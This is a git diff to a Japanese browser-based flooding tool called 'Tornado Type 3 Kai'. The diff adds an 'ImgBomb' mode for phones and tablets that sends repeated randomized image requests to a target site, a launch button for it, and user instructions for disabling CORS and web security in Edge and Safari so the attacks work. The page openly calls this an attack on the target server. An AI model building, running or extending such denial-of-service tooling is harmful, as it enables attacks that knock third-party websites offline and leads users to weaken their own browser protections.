@@ -332,6 +332,20 @@ async function RequestGenerator(mode) {
           await my_sleep(randRange(610, 900));
 
 
+    } else if (mode==11) {
+      //for (i=0; i<2; i++) {
+        UrlGenerator();
+        var pic = new Image();
+        var rand = Math.floor(Math.random() * 1000)
+        pic.src = URL+'/?'+rand+'=val'
+        UrlGenerator();
+        var pic = new Image();
+        var rand = Math.floor(Math.random() * 1000)
+        pic.src = URL+'/?'+rand+'=val'
+
+      //}
+      //await my_sleep(randRange(610, 900));
+
     } else {
         //もしもの時のため
         alert("[エラー] modeの値は" + mode + "です。これは不正な値です。")
@@ -347,7 +361,7 @@ function modeselect() {
     for(i = 0; i < m_inWinNum; i++) {
       RequestGenerator(mode);
       if (MODE==10) {
-      console.log("sleep at mode10")
+      //console.log("sleep at mode10")
       //sleep(randRange(610, 900));
       
     } else {}
@@ -501,6 +515,24 @@ function main_img() {
 
 }
 
+function main_mobile() {
+    m_inInterval = document.m_form1.m_tbInterval.value;
+		m_inWinNum = document.m_form1.m_tbWinNum.value;
+		m_stBomburl = document.m_form1.m_tbUrl.value;
+		postdata_from_user = document.m_form1.postdata_from_user.value;
+		http_method = document.m_form1.SELECT.value;
+		m_inCount = 0;
+    wildcard_detect(postdata_from_user, m_stBomburl);
+		if(IsUrlVaild==0 || IsPostdataVaild==0) {
+			return false;
+		} else {
+			
+		}
+			attackmode="ImgBomb_mobile"
+      MODE = 11;
+			modeselect(11);
+}
+
 </script>
 
 <script>
@@ -531,7 +563,7 @@ async function stopBomb_normal() {
 			clearTimeout(m_toDoing);
 		}
 		document.all.m_taInfo.value += "\n\n";
-		document.all.m_taInfo.value += "～開始1での訪問を中止しました～";
+		document.all.m_taInfo.value += "*攻撃を停止しました";
 	}
 
 function bombCounter() {
@@ -869,7 +901,7 @@ details[open] .summary_inner::after {
     </style>
 
     <body  class="backgroundcolor"  style="font-size: 35;">
-        <h1>トルネード三式・改 Beta版 by 新参者</h1>
+        <h1>トルネード三式・改 Beta版</h1>
         <b>[2024.04.15版]</b>
         <br>
         <br>
@@ -926,7 +958,7 @@ details[open] .summary_inner::after {
         <input class="css-button-rounded--black" type="text" name="m_tbUrl" size=55 placeholder="https://www.google.com">
         <br>
         <br>
-        <b>【imgボム用対象サイトの画像URL】<br> <font color="red">httpsサイトのみ対応/png,jpg,gif,webm等の拡張子</font></b>
+        <b>【imgボム用対象サイトの画像URL】<br> <font color="red">png,jpg,gif,webm等の拡張子</font></b>
         <input class="css-button-rounded--black" type="text" name="m_imgUrl" size=55 placeholder="https://www.example.com/images/image.png">
         <br>
         <br>
@@ -949,7 +981,10 @@ details[open] .summary_inner::after {
         <br>
         <input class="css-button-rounded--black" type="button" value="開始1" onclick="main();">  <input class="css-button-rounded--black" type="button" value="開始2(XML)" onclick="main_XML();">  <input class="css-button-rounded--black" type="button" value="開始3(fetch)" onclick="main_fetch();"><br>
         
-        <input class="css-button-rounded--black" type="button" value="Imgボム改(Beta版)" onclick="main_img();" style="color: orangered;">
+        <b>[発射ボタン(全端末対応)]</b>
+        <br>
+        <input class="css-button-rounded--black" type="button" value="Imgボム改(Beta版)" onclick="main_img();" style="color: orangered;">  <input class="css-button-rounded--black" type="button" value="開始（スマホ/タブレット）" onclick="main_mobile();" style="color: gold;">
+        <br>
         <br>
         <b>[停止/ログクリアボタン]</b>
         <br>
@@ -984,13 +1019,62 @@ details[open] .summary_inner::after {
         <br>
         <li>Safariが一番高効率</li>
         <li><strong><font color="red">MacユーザはCORSを回避する必要がある。詳しくは下記を参照</font></strong></li>
+        <li>iPhone/iPadユーザはCORSを無効化できないので<mark>全端末対応の攻撃モード</mark>を使用することを推奨。</li>
         <b>[Android/Chromebookユーザ]</b>
         <br>
         <li>ChromeかEdgeが一番高効率</li>
+        <li>アプリでCORSを無効にできないため<mark>全端末対応の攻撃モード</mark>を使用することを推奨。</li>
         <h2>【CORSの回避方法】</h2>
-        <a href=""><font color="lime">&ltWindowsの方はこちらを参照&gt</font></a>
-        <br>
-        <a href=""><font color="lime">&ltMacユーザの方はこちらを参照&gt</font></a>
+        <div class="wrapper">
+          <div class="wrapper_normalIcon">
+            <details>
+              <summary>
+                <span class="summary_inner">
+                  [Windowsユーザ]<span class="icon"></span>
+                </span>
+              </summary>
+              <div class="content">
+                <ul>
+                  <b>[EdgeでのCORS回避方法]</b>
+                  <br>
+                  1. Windows(のマーク)キー+Rキーを同時押しする。
+                  <br>
+                  2. cmdと入力して検索する
+                  <br>
+                  3. コマンドプロンプトが開く。下記のコードをコピペして実行する。
+                  <br>
+                  <div class="scroll2">
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir=C:\Windows\Temp https://rifurekusyon.github.io/tornado.github.io/Tashiro_kai.html
+                  </div>
+                  <br>
+                  4. このサイトがもう一度開く。これで攻撃ができるようになる。
+                </ul>
+              </div>
+            </details>
+          </div>
+        </div>
+        <div class="wrapper">
+          <div class="wrapper_normalIcon">
+            <details>
+              <summary>
+                <span class="summary_inner">
+                  [Macユーザ]<span class="icon"></span>
+                </span>
+              </summary>
+              <div class="content">
+                <ul>
+                  <b>[SafariでのCORS回避方法]</b>
+                  <br>
+                  1. Safariを開いて「Safari」タブ > 「環境設定(又は設定)」タブ > 「詳細」タブ > 「メニューバーに“開発“メニューを表示」にチェックを入れる。
+                  <br>
+                  2. Safariのタブの「開発」 > 「クロスオリジンの制限を無効にする」にチェックを入れる。
+                  <br>
+                  3. 田代砲を再読み込みする。→完了 (使用後は必ず設定を戻してください。)
+                </ul>
+              </div>
+            </details>
+          </div>
+        </div>
         <br>
         <h2>【その他】</h2>
         <b>[動作が重い場合]</b>
@@ -1166,9 +1250,20 @@ details[open] .summary_inner::after {
           <b>[開始3]</b>
           <li>fetch apiを用いて訪問します。</li>
           <li>訪問速度で言えば一番高性能ですが上記の開始2と同じような制約を受けます。</li>
-		  <li><mark><font color="red">Android/Chromebookで『Chrome Dev』を使っている人と他のPCユーザはこれを推奨します。</font></mark></li>
-	 <br> 
-	 <mark><b>仕様上、開始2と開始3は開始1と違い訪問用の窓が開かないので注意</b></mark>
+		      <li><mark><font color="red">Android/Chromebookで『Chrome Dev』を使っている人と他のPCユーザはこれを推奨します。</font></mark></li>
+          <br>
+          <b>[Imgボム]</b>
+          <li>対象のwebサイト上にある画像ファイルを大量にリクエストするメソッドです。</li>
+          <li>専用のURL入力欄に、対象サイトのサーバ上にある画像のURLを入力してください。例: https://www.tatoeba.com/gazou.png</li>
+          <br>
+          <b>[開始(スマホ/タブレット)]</b>
+          <li>スマホ/タブレット向けの開始ボタンです。</li>
+
+	        <br> 
+	        <mark><b>仕様上、開始2と開始3は開始1と違い訪問用の窓が開かないので注意</b></mark>
+          <br>
+          <mark><font color="red">それぞれのモードは同時使用が可能です。ただし、やりすぎるとフリーズします。</font></mark>
+
         </ul>
       </div>
     </details>
@@ -1248,7 +1343,7 @@ details[open] .summary_inner::after {
 		<div class="content">
 				  <ul>
 					  <li>単位時間当たりどれくらい送信処理が出来ているかリアルタイムで表示します。。</li>
-					  <li>まあ、雰囲気的な物であまり意味はないです。</li>
+					  <li>雰囲気的な物であまり意味はないです。</li>
 				  </ul>
 			  </div>
 	  </details>
